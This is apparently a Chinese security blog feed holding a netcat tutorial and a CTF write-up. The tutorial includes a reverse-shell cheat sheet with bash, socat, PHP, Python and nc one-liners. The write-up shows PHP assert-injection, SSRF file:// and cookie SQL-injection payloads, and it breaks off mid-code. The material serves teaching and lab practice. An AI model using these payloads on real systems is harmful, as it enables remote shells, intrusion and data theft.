class="line">-u：使用UDP传输协议；</span><br><span class="line">-v：显示指令执行过程；</span><br><span class="line">-w&lt;超时秒数&gt;：设置等待连线的时间；</span><br><span class="line">-z：使用0输入&#x2F;输出模式，只在扫描通信端口时使用。</span><br></pre></td></tr></table></figure><p><strong>参数：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">主机：指定主机的IP地址或主机名称；</span><br><span class="line">端口号：可以是单个整数或者是一个范围。</span><br></pre></td></tr></table></figure><h2 id="TCP端口扫描"><a href="#TCP端口扫描" class="headerlink" title="TCP端口扫描"></a>TCP端口扫描</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># nc -v -z -w2 192.168.0.3 1-100</span><br><span class="line">-v：显示指令执行过程；</span><br><span class="line">-z：使用0输入&#x2F;输出模式，只在扫描通信端口时使用。</span><br><span class="line">-w2：设置等待连线的时间为2s；</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# nc -v -z -w2 192.168.211.106 38324</span><br><span class="line">192.168.211.106: inverse host lookup failed: Unknown host</span><br><span class="line">(UNKNOWN) [192.168.211.106] 38324 (?) open</span><br><span class="line"></span><br><span class="line">root@kali:~&#x2F;Desktop# nc -v -z -w2 192.168.211.106 38322-38325</span><br><span class="line">192.168.211.106: inverse host lookup failed: Unknown host</span><br><span class="line">(UNKNOWN) [192.168.211.106] 38324 (?) open</span><br></pre></td></tr></table></figure><h2 id="UDP端口扫描"><a href="#UDP端口扫描" class="headerlink" title="UDP端口扫描"></a>UDP端口扫描</h2><pre><code># nc -u -z -w2 192.168.0.1 1-1000 //扫描192.168.0.3 的端口 范围是 1-1000</code></pre><h2 id="扫描指定端口"><a href="#扫描指定端口" class="headerlink" title="扫描指定端口"></a>扫描指定端口</h2><pre><code># nc -nvv 192.168.0.1 80 //扫描 80端口(UNKNOWN) [192.168.0.1] 80 (?) open</code></pre><h2 id="使用netcat实现局域网聊天"><a href="#使用netcat实现局域网聊天" class="headerlink" title="使用netcat实现局域网聊天"></a>使用netcat实现局域网聊天</h2><p>一端先启好监听：</p><pre><code>nc -l 9999</code></pre><p>另一端端进行连接：</p><pre><code>nc 192.168.220.128 9999</code></pre><p>连接之后的任一边的输入在另一边都可看到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#Ubantu (192.168.118.137 9999)</span><br><span class="line"></span><br><span class="line">ldl@ubuntu:~$ nc -l 9999</span><br><span class="line">wode</span><br><span class="line">我的</span><br><span class="line">Linux真好用 ^H，^H^H-&#x3D;13</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#kali(192.168.118.134)</span><br><span class="line"></span><br><span class="line">root@kali:~&#x2F;Desktop# nc 192.168.118.137 9999</span><br><span class="line">wode^H^H^H</span><br><span class="line">我的</span><br><span class="line">Linux真好用-&#x3D;13</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现输入的内容（中文英文字符）都可以正确解析，但是非打印字符不会传输。退格等键无用。   </p><p>Ctrl+C 断开连接。   </p><h2 id="使用netcat实现文件传输"><a href="#使用netcat实现文件传输" class="headerlink" title="使用netcat实现文件传输"></a>使用netcat实现文件传输</h2><p>和局域网聊天是原理一样的，不过把输入输出重定向到文件<br>接收入端先启好监听：</p><pre><code>nc -l 9999 &gt; recv.txt</code></pre><p>发送端进行发送：</p><pre><code>nc 192.168.220.128 9999 &lt; send.txt</code></pre><p>不过传输完之后不会自动断开连接得手动ctrl+c断开，而且转输完成并没有什么标志不知是否已传完。</p><hr><p>接收端：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldl@ubuntu:~&#x2F;Desktop$ ls</span><br><span class="line">源代码</span><br><span class="line">ldl@ubuntu:~&#x2F;Desktop$ nc -l 9999 &gt; test.c</span><br><span class="line">^C</span><br><span class="line">ldl@ubuntu:~&#x2F;Desktop$ ls</span><br><span class="line">test.c  源代码</span><br></pre></td></tr></table></figure><p>发送端：</p><pre><code>root@kali:~/Desktop# nc 192.168.118.137 9999 &lt; test.c</code></pre><hr><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h2 id="什么是反弹shell"><a href="#什么是反弹shell" class="headerlink" title="什么是反弹shell"></a>什么是反弹shell</h2><blockquote><p>想要搞清楚这个问题，首先要搞清楚什么是反弹，为什么要反弹。</p><p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。</p><p>那么什么情况下正向连接不太好用了呢？</p><ol><li>某客户机中了你的网马，但是它在局域网内，你直接连接不了。它的ip会动态改变，你不能持续控制。</li><li>由于防火墙等限制，对方机器只能发送请求，不能接收请求。</li><li>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</li></ol><p>那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。<br>本质上是网络概念的客户端与服务端的角色反转。通常用于被控端因防火墙受限、权限不足、端口被占用等情形。</p><p>作者：玄魂工作室-玄魂</p></blockquote><h2 id="反弹shell的各种姿势"><a href="#反弹shell的各种姿势" class="headerlink" title="反弹shell的各种姿势"></a>反弹shell的各种姿势</h2><h3 id="netcat工具反弹"><a href="#netcat工具反弹" class="headerlink" title="netcat工具反弹"></a>netcat工具反弹</h3><p>(1)受害者（目标机 kali）</p><pre><code>root@kali:~# nc -lvvp 8080 -t -e /bin/bash</code></pre><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180822/Ie5H1DJL68.png?imageslim" alt="mark"></p><p>(2)攻击者(Linux)</p><pre><code>nc 192.168.118.138 8080</code></pre><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180822/2G6kIKgbJ8.png?imageslim" alt="mark"></p><h3 id="bash直接反弹"><a href="#bash直接反弹" class="headerlink" title="bash直接反弹"></a>bash直接反弹</h3><p>(1) 目标机bash一句话</p><pre><code>bash -i &gt;&amp; /dev/tcp/attacker-IP/Port 0&gt;&amp;1e.g.bash -i &gt;&amp; /dev/tcp/192.168.118.138/1234 0&gt;&amp;1</code></pre><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180822/CjLH7GHeaK.png?imageslim" alt="mark"></p><p>(2) 攻击者监听shell</p><pre><code>nc -lvvp Porte.g.nc -lvvp 1234</code></pre><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180822/dm1Ah714Ic.png?imageslim" alt="mark"></p><p>bash反弹一句话的拆分说明<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180822/2k2lEB4IfL.bmp" alt="mark"><br>bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。</p><h3 id="socat反弹一句话"><a href="#socat反弹一句话" class="headerlink" title="socat反弹一句话"></a>socat反弹一句话</h3><p>Socat是Linux 下一个多功能的网络工具，名字来由是” Socket CAT”，因此可以看出它基于socket，能够折腾socket相关的无数事情 ，其功能与netcat类似，不过据说可以看做netcat的加强版,事实上的确也是如此，nc应急比较久没人维护了，确实显得有些陈旧了，我这里只简单的介绍下怎么使用它开启监听和反弹shell，其他详细内容可以参加见文末的参考学习。</p><p>有关socat二进制可执行文件，大家可以到这个链接下载：<a href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat">https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat</a> </p><p><strong>kali中有</strong></p><p>(1) 攻击机开启监听</p><pre><code>socat tcp-listen:6666 -</code></pre><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180822/H03LJdaJ2C.png?imageslim" alt="mark"></p><p>(2) 靶机运行socat反弹shell</p><pre><code>root@ubuntu:~# socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:192.168.118.138:6666</code></pre><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180822/AlD5dA1icI.png?imageslim" alt="mark"></p><h3 id="php脚本反弹"><a href="#php脚本反弹" class="headerlink" title="php脚本反弹"></a>php脚本反弹</h3><p>靶机上运行</p><pre><code>php -r &#39;$sock=fsockopen(&quot;192.168.118.138&quot;,8888);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180822/ilAcf5E1E7.png?imageslim" alt="mark"></p><p>攻击者上运行</p><pre><code>nc -lvvp 8888</code></pre><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180822/182DB6Cc8k.png?imageslim" alt="mark"></p><h3 id="python脚本反弹"><a href="#python脚本反弹" class="headerlink" title="python脚本反弹"></a>python脚本反弹</h3><p>攻击者运行</p><pre><code>nc -lvvp 8080</code></pre><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180822/99dB7Imkg3.png?imageslim" alt="mark"></p><p>靶机上运行</p><pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.118.138&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180822/9kEj4Fid8D.png?imageslim" alt="mark"></p><hr><p>先总结这几种，还有一些不常用，之后遇到再说。</p><h2 id="反弹shell-命令总结"><a href="#反弹shell-命令总结" class="headerlink" title="反弹shell 命令总结"></a>反弹shell 命令总结</h2><p>bash版本：</p><pre><code>bash -i &gt;&amp; /dev/tcp/&lt;attackerIP&gt;/[port] 0&gt;&amp;1bash -i &gt;&amp; /dev/tcp/192.168.118.138/6666 0&gt;&amp;1</code></pre><p>注意这个是由解析shell的bash完成，所以某些情况下不支持</p><p>python版本：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure><p>php版本：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure><p>nc版本：</p><pre><code> nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999</code></pre><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://www.anquanke.com/post/id/87017">linux各种一句话反弹shell总结 </a></li><li><a href="http://www.zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html">各种环境下反弹 shell 的方法 </a></li><li><a href="https://le4f.net/post/post/reverse-shell-during-the-penetration-test">渗透测试:反弹与转发小结</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XMAN2018 排位赛wp</title>
      <link href="/2018/08/11/XMAN2018%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/"/>
      <url>/2018/08/11/XMAN2018%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h1 id="XMAN2018-排位赛wp"><a href="#XMAN2018-排位赛wp" class="headerlink" title="XMAN2018 排位赛wp"></a>XMAN2018 排位赛wp</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>感觉到了Web狗在CTF比赛中存活的艰难</p><p>其实笔者并没有参加XMAN集训营，但是从朋友那弄到8.10XMAN排位赛的一点题目，质量很不错，解了一两个web题目，misc解了三四个吧，反正很菜很菜。。。</p><p>但是确实学习到一些东西，又去网上找了wp详细看了，总结一下。</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="0x01-Meizijiu-magic2"><a href="#0x01-Meizijiu-magic2" class="headerlink" title="0x01 Meizijiu_magic2"></a>0x01 Meizijiu_magic2</h2><blockquote><p>文件上传到云<br>链接：<a href="https://pan.baidu.com/s/1c2xBggREtl2XvCQEGlZocw">https://pan.baidu.com/s/1c2xBggREtl2XvCQEGlZocw</a> 密码：6qzz</p></blockquote><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>看到<code>hint token_get_all()</code><br>打开下载的txt文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;Applications&#x2F;MAMP&#x2F;htdocs&#x2F;CTF&#x2F;XMAN&#x2F;code.php:3:</span><br><span class="line">array (size&#x3D;232)</span><br><span class="line">  0 &#x3D;&gt; </span><br><span class="line">    array (size&#x3D;3)</span><br><span class="line">      0 &#x3D;&gt; int 376</span><br><span class="line">      2 &#x3D;&gt; int 1</span><br><span class="line">  1 &#x3D;&gt; </span><br><span class="line">    array (size&#x3D;3)</span><br><span class="line">      0 &#x3D;&gt; int 312</span><br><span class="line">      1 &#x3D;&gt; string &#39;&#39; (length&#x3D;2)</span><br><span class="line">      2 &#x3D;&gt; int 2</span><br><span class="line">  2 &#x3D;&gt; </span><br><span class="line">    array (size&#x3D;3)</span><br><span class="line">      0 &#x3D;&gt; int 379</span><br><span class="line">      2 &#x3D;&gt; int 2</span><br><span class="line">  3 &#x3D;&gt; string &#39;&#x3D;&#39; (length&#x3D;1)</span><br><span class="line">  4 &#x3D;&gt; </span><br><span class="line">    array (size&#x3D;3)</span><br><span class="line">      1 &#x3D;&gt; string &#39; &#39; (length&#x3D;1)</span><br><span class="line">      2 &#x3D;&gt; int 2</span><br><span class="line">..............</span><br></pre></td></tr></table></figure><p>题目使用了<a href="http://php.net/manual/en/function.token-get-all.php">token_get_all</a>的解析器，将代码转换成上面的样子</p><p>这里手动解析挨行转换，将空格和其他空白符用*号代替</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">**=*******;</span><br><span class="line">*****=*base64_decode(******);</span><br><span class="line">****=*;</span><br><span class="line">$dd****=*<span class="number">85</span>;</span><br><span class="line">$____*=**********;</span><br><span class="line">*******=*<span class="string">&quot;In&quot;</span>.***.<span class="string">&quot;P&quot;</span>.<span class="string">&quot;h&quot;</span>.***;</span><br><span class="line">($i=<span class="number">0</span>;$i&lt;<span class="number">10</span>;$i++)&#123;</span><br><span class="line">$dd=*=*$dd*+*<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">*********=*chr($dd);</span><br><span class="line">$dc*=*$dd;</span><br><span class="line">&#123;</span><br><span class="line">$dd*=*$dc*+*$dc;</span><br><span class="line">$dc;</span><br><span class="line">($dc&lt;<span class="number">100</span>)</span><br><span class="line">$_GET[<span class="string">&#x27;secret&#x27;</span>]*=*<span class="keyword">isset</span>($_GET[<span class="string">&#x27;secret&#x27;</span>])?$_GET[<span class="string">&#x27;secret&#x27;</span>]:<span class="number">1</span>;</span><br><span class="line">($_GET[<span class="string">&#x27;secret&#x27;</span>]&#123;</span><br><span class="line">*<span class="number">1</span>:</span><br><span class="line"><span class="keyword">echo</span>*<span class="string">&quot;XMAN2018!&quot;</span>;</span><br><span class="line">;</span><br><span class="line">*<span class="number">4</span>:</span><br><span class="line">;</span><br><span class="line">*$dd:$f1*=***.&#123;.<span class="string">&quot;***&quot;</span>.********.****.********.str_rot13(*****).******.******;</span><br><span class="line"><span class="keyword">echo</span>*$f1;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">:</span><br><span class="line">*<span class="string">&quot;XMAN NB!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然看不了完整逻辑，但是大概的逻辑还是能看的出来的。<br><code>secret</code>接受一个参数，然后接受一个数，由于<code>$dc&lt;100</code>可以判断最终数字应该不大，于是可以爆破，<br><code>secret=198</code><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180816/kHbI4C7Aj6.png?imageslim" alt="mark"></p><p>最后贴上题目源码（无马赛克:-)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_   &#x3D; &quot;FLAG&quot;;</span><br><span class="line">$__  &#x3D; base64_decode(&quot;QVNU&quot;);</span><br><span class="line">$___ &#x3D; &quot;TOKEN&quot;;</span><br><span class="line">$dd    &#x3D; &quot;85&quot;;</span><br><span class="line">$____ &#x3D; &quot;Erirefr&quot;;</span><br><span class="line">$_____ &#x3D; &quot;In&quot;.&quot;-&quot;.&quot;P&quot;.&quot;h&quot;.&quot;p&quot;;</span><br><span class="line">for($i&#x3D;0;$i&lt;10;$i++)&#123;</span><br><span class="line">    $dd &#x3D; $dd + 1;</span><br><span class="line">&#125;</span><br><span class="line">$_______ &#x3D; chr($dd);</span><br><span class="line">$dc &#x3D; $dd;</span><br><span class="line">do&#123;</span><br><span class="line">    $dd &#x3D; $dc + $dc;</span><br><span class="line">    $dc++;</span><br><span class="line">&#125;while($dc&lt;100);</span><br><span class="line">$_GET[&#39;secret&#39;] &#x3D; isset($_GET[&#39;secret&#39;])?$_GET[&#39;secret&#39;]:1;</span><br><span class="line">switch($_GET[&#39;secret&#39;])&#123;</span><br><span class="line">    case 1:</span><br><span class="line">        echo &quot;XMAN2018!&quot;;</span><br><span class="line">        break;</span><br><span class="line">    case 4:</span><br><span class="line">        break;</span><br><span class="line">    case $dd:</span><br><span class="line">        $fl &#x3D; $_.&quot;&#123;&quot;.&quot;$__&quot;.$_______.$___.$_______.str_rot13($____).$_____.&quot;!@#&#125;&quot;;</span><br><span class="line">        echo $fl;</span><br><span class="line">        break;</span><br><span class="line">    default:</span><br><span class="line">        echo &quot;XMAN NB!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>php简单审计，php-token_get_all</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>其实这道题一点都不难，只要能把代码还原出来，大概能读懂代码逻辑，问题就迎刃而解，但是由于没有好的办法，php也没有还原函数，还原过程有点费劲。</p><h2 id="MAKEIT"><a href="#MAKEIT" class="headerlink" title="MAKEIT"></a>MAKEIT</h2><h3 id="原题链接"><a href="#原题链接" class="headerlink" title="原题链接"></a>原题链接</h3><p><a href="http://202.112.51.184:15080/">http://202.112.51.184:15080/</a></p><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>有Git源码泄露，Githack得到源码，在index.php中</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;page&#39;])) &#123;</span><br><span class="line">$page &#x3D; $_GET[&#39;page&#39;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$page &#x3D; &quot;home&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file &#x3D; &quot;templates&#x2F;&quot; . $page . &quot;.php&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; I heard &#39;..&#39; is dangerous!</span><br><span class="line">assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) &#x3D;&#x3D;&#x3D; false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; TODO: Make this look nice</span><br><span class="line">assert(&quot;file_exists(&#39;$file&#39;)&quot;) or die(&quot;That file doesn&#39;t exist!&quot;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>传入page参数，file可控，可以构造payload使assert函数闭合，然后RCE</li><li>构造payload<code>?page=&#39;, &#39;..&#39;) === false and system(&quot;cat templates/flag.php&quot;);//</code></li><li>payload<code>&#39; and die(show_source(&quot;templates/flag.php&quot;)) or &#39;</code></li><li>PHP语句就变成了<code>assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) === false&quot;) and system(&quot;cat templates/flag.php&quot;);//</code></li><li>查看页面源代码得到flag<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php $FLAG&#x3D;&quot;XMAN&#123;flag_is_so_cool&#125;&quot;; ?&gt;</span><br><span class="line">That file doesn&#39;t exist!</span><br></pre></td></tr></table></figure><h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3>XMAN{flag_is_so_cool}</li></ul><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><p>.git源码泄露，远程命令执行</p><h2 id="SIMPLE-SSRF"><a href="#SIMPLE-SSRF" class="headerlink" title="SIMPLE SSRF"></a>SIMPLE SSRF</h2><h3 id="原题链接-1"><a href="#原题链接-1" class="headerlink" title="原题链接"></a>原题链接</h3><p><a href="http://202.112.51.184:11080/">http://202.112.51.184:11080</a></p><p>题目hint:</p><pre><code>1. flag格式：XMAN&#123;.*&#125;2. hint:curl3. hint:flag在/etc/flag.txt</code></pre><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>首先尝试更换url为<code>https://sina.cn</code><br>返回<code>wrong site</code>，判断是对url做了检测<br>采用<code>file</code>协议进行读取<code>flag.txt</code>文件</p><p><a href="http://202.112.51.184:11080/?site=file://www.baidu.com/etc/flag.txt">http://202.112.51.184:11080/?site=file://www.baidu.com/etc/flag.txt</a></p><blockquote><p>get source failed.</p></blockquote><p>尝试%00截断<br><a href="http://202.112.51.184:11080/?site=file://www.baidu.com/etc/flag.txt%00">http://202.112.51.184:11080/?site=file://www.baidu.com/etc/flag.txt%00</a></p><blockquote><p>还是 get source failed.</p></blockquote><p>怀疑是把特殊字符过滤了<br>url转码后，得到flag</p><p><a href="http://202.112.51.184:11080/?site=file://www.baidu.com/etc/flag.txt%2500">http://202.112.51.184:11080/?site=file://www.baidu.com/etc/flag.txt%2500</a></p><blockquote><p>XMAN{f1l3_pr0toc0l_1s_us3ful}</p></blockquote><h3 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h3><p>XMAN{f1l3_pr0toc0l_1s_us3ful}</p><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><p>SSRF,file协议，简单bypass</p><h2 id="BBSQLI"><a href="#BBSQLI" class="headerlink" title="BBSQLI"></a>BBSQLI</h2><h3 id="原题链接-2"><a href="#原题链接-2" class="headerlink" title="原题链接"></a>原题链接</h3><p><a href="http://202.112.51.184:16080/">http://202.112.51.184:16080/</a></p><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>POST GET均无效，尝试cookie注入，发现</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cookie:PHPSESSID&#x3D;1&#39; and 1&#x3D;1 --+</span><br><span class="line">结果：</span><br><span class="line">Your secrets</span><br><span class="line">123</span><br><span class="line">sss</span><br><span class="line">-----</span><br><span class="line">Cookie:PHPSESSID&#x3D;1&#39; and 1&#x3D;2 --+</span><br><span class="line">结果</span><br><span class="line">You don&#39;t have any secrets yet.</span><br></pre></td></tr></table></figure><p>说明存在SQL注入漏洞，接下来简单的<code>union</code>联合查询也就可以得到结果了。也可以布尔盲注，错误的话，显示信息都是<code>You don&#39;t have any secrets yet.</code><br>下面测试<code>union</code>联合查询：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 测试发现只有2列</span><br><span class="line">Cookie: PHPSESSID&#x3D;1&#39; group by 2--+;</span><br><span class="line"></span><br><span class="line"># 确定可用列</span><br><span class="line">Cookie: PHPSESSID&#x3D;1&#39; union select 1,2--+;</span><br></pre></td></tr></table></figure><blockquote><p>返回2，2可用</p></blockquote><p><strong>查表名</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cookie: PHPSESSID&#x3D;1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;database() --+</span><br><span class="line"></span><br><span class="line">表名：</span><br><span class="line">[GDJM_flag]</span><br><span class="line">secrets</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180817/IECk4icfE9.png?imageslim" alt="mark"></p><p><strong>查列名</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cookie: PHPSESSID&#x3D;1&#39; union select 1,column_name from information_schema.columns where table_schema&#x3D;database() --+;</span><br><span class="line"></span><br><span class="line">列名</span><br><span class="line">flag</span><br><span class="line">session_id</span><br><span class="line">secret</span><br></pre></td></tr></table></figure><p><strong>GetFlag</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cookie: PHPSESSID&#x3D;1&#39; union select 1,flag from &#96;[GDJM_flag]&#96;--+;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180817/2I3G5lGfg4.png?imageslim" alt="mark"></p><h3 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h3><p>xman{YoVr_4R3_a_Bada5s_Ge7_My_Fl4g}</p><h3 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h3><p>Cooike 注入</p><h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><p>这里有一点点坑，就是涉及到<code>[]</code>命名的表名，列名都需要加`反引号，否则报错。</p><p>看了sql文件：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DROP DATABASE IF EXISTS &#96;sqli&#96;;</span><br><span class="line"></span><br><span class="line">CREATE DATABASE &#96;sqli&#96;;</span><br><span class="line"></span><br><span class="line">USE &#96;sqli&#96;;</span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS &#96;secrets&#96;;</span><br><span class="line"></span><br><span class="line">CREATE TABLE &#96;secrets&#96; (</span><br><span class="line">  &#96;session_id&#96; varchar(50) DEFAULT NULL,</span><br><span class="line">  &#96;secret&#96; varchar(200) DEFAULT NULL</span><br><span class="line">) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;latin1;</span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS &#96;[GDJM_flag]&#96;;</span><br><span class="line">CREATE TABLE &#96;[GDJM_flag]&#96;(</span><br><span class="line">&#96;flag&#96; varchar(50) DEFAULT NULL</span><br><span class="line">) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;latin1;</span><br><span class="line"></span><br><span class="line">LOCK TABLES &#96;[GDJM_flag]&#96; WRITE;</span><br><span class="line"></span><br><span class="line">INSERT INTO &#96;[GDJM_flag]&#96; VALUES (&#39;xman&#123;YoVr_4R3_a_Bada5s_Ge7_My_Fl4g&#125;&#39;);</span><br><span class="line"></span><br><span class="line">UNLOCK TABLES;</span><br><span class="line">flush privileges;</span><br><span class="line">CREATE USER &#39;sqli&#39;@&#39;%&#39; IDENTIFIED BY &#39;sqli&#39;;</span><br><span class="line">grant all ON *.*  to &#39;sqli&#39;@&#39;%&#39;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><p>发现其中涉及库名，表名，字段名的都是用反引号的，后来在sql命令行中尝试过不用反引号的带有[]的表名报错，并且用mysql命令行查询时，不加反引号报错，所以判定，当在mysql中反引号并不只是把保留关键字当用户名，并且遇到带中文和[]的命名时，也需要用反引号，所以在sql注入中看到中括号就考虑反引号就可以。<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180817/Ajii7IKbEe.png?imageslim" alt="mark"></p><h2 id="SSHOP"><a href="#SSHOP" class="headerlink" title="SSHOP"></a>SSHOP</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述:"></a>题目描述:</h3><pre><code>http://202.112.51.184:13080/flag格式：flag&#123;.*&#125;</code></pre><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路:"></a>解题思路:</h3><p>打开题目后发现能直接把源码下下来审计, 发现只要<code>session[&#39;admin&#39;]==True</code>就能获得 flag.<br>首先看一下判断部分的代码:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 用户信息</span><br><span class="line">@users.route(&#39;&#x2F;&#39;)</span><br><span class="line">def user():</span><br><span class="line">    if not login_status_check():</span><br><span class="line">        return redirect(url_for(&#39;users.login&#39;))</span><br><span class="line">    flag &#x3D; open(&#39;.&#x2F;flag&#39;).read() if is_admin() else False</span><br><span class="line">    return render_template(&#39;user.html&#39;, user&#x3D;user, flag&#x3D;flag, current_user&#x3D;1)</span><br><span class="line"></span><br><span class="line">def is_admin():</span><br><span class="line">    if login_status_check():</span><br><span class="line">        return 